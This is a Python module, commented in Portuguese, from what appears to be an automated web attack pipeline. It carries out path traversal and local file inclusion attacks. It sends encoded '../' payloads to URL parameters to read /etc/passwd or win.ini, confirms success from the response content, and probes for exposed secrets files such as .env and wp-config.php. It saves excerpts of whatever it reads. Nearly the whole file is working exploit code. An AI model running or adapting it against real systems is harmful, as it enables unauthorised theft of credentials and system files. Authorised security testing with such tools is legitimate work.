"""
attack/path_attacker.py — Pipeline 4: Ataques de Path Traversal, LFI e Sensitive Paths.

Com base nos findings de traversal/sensitive paths:
  1. Tenta LFI (Local File Inclusion) para ler /etc/passwd ou c:/windows/win.ini
  2. Tenta ler arquivos de configuração comuns (.env, config.php, wp-config.php)
  3. Tenta Log Poisoning básico caso LFI tenha sucesso.
"""
import urllib.parse
import requests
from core.utils import print_status

TRAVERSAL_PREFIXES = [
    "",
    "../" * 5,
    "..%2f" * 5,
    "....//" * 5,
    "..\\" * 5,
]

LFI_TARGETS = {
    "unix": "/etc/passwd",
    "win":  "windows/win.ini"
}

CONFIG_FILES = [
    ".env", "config.php", "wp-config.php", "database.yml", "docker-compose.yml"
]

class PathAttacker:
    def __init__(self, target: str, findings: list, context=None):
        self.target   = target
        self.findings = findings
        self.context  = context
        self.results  = {
            "files_read": [],
            "app_configs": [],
            "log_poison": False,
            "attack_log": []
        }

    def _log(self, msg, level="INFO"):
        print_status(f"[Path] {msg}", level)
        self.results["attack_log"].append(msg)

    def _test_lfi(self, url: str, param: str):
        """Testa LFI básico em um parâmetro."""
        self._log(f"Testando LFI no parâmetro '{param}' em {url}", "INFO")
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        
        for prefix in TRAVERSAL_PREFIXES:
            for os_type, target_file in LFI_TARGETS.items():
                payload = f"{prefix}{target_file}"
                test_qs = dict(qs)
                test_qs[param] = payload
                test_query = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = parsed._replace(query=test_query).geturl()
                
                try:
                    r = requests.get(test_url, timeout=5, verify=False)
                    text = r.text
                    
                    if os_type == "unix" and "root:x:0:0:" in text:
                        self._log(f"LFI CONFIRMADO! Lendo /etc/passwd via {payload}", "CRIT")
                        self._record_read_file(test_url, "/etc/passwd", text)
                        return True
                    elif os_type == "win" and "[extensions]" in text.lower():
                        self._log(f"LFI CONFIRMADO! Lendo win.ini via {payload}", "CRIT")
                        self._record_read_file(test_url, "win.ini", text)
                        return True
                except Exception:
                    pass
        return False

    def _record_read_file(self, url: str, filename: str, content: str):
        self.results["files_read"].append({
            "file": filename,
            "url": url,
            "excerpt": content[:100].replace('\n', ' ')
        })

    def _test_configs(self, base_url: str):
        """Testa leitura de configs sensíveis."""
        for cfg in CONFIG_FILES:
            test_url = base_url.rstrip('/') + '/' + cfg
            try:
                r = requests.get(test_url, timeout=5, verify=False)
                if r.status_code == 200 and len(r.text) > 0 and "<html" not in r.text.lower()[:50]:
                    self._log(f"Configuração sensível exposta: {test_url}", "CRIT")
                    self.results["app_configs"].append({
                        "file": cfg,
                        "url": test_url,
                        "excerpt": r.text[:100].replace('\n', ' ')
                    })
            except Exception:
                pass

    def run(self) -> dict:
        traversal_findings = [
            f for f in self.findings 
            if any(k in (f.get("issue","") + f.get("type","")).lower() for k in ["lfi", "traversal", "path", "inclusion"])
        ]
        
        # Testar LFI nos parâmetros encontrados
        for finding in traversal_findings:
            url = finding.get("url", "")
            param = finding.get("param", "")
            if not param:
                # Se não tem parametro específico, tenta inferir da query string
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                for p in qs:
                    self._test_lfi(url, p)
            else:
                self._test_lfi(url, param)

        # Também testa configs na raiz
        self._test_configs(self.target)

        return self.results
